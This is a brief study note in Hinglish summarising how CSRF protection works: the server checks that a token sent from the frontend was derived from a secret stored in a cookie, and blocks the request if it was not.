Final Concept Summary
=========================================

CSRF Protection = Cookie Secret + Derived Token Verification

Server verify karta hai ki:
"Frontend se aaya token kya isi secret se bana hai?"

Agar haan → Valid Request
Agar nahi → Block

User ko manually kuch pata nahi hota.
Sab process internally hota hai.
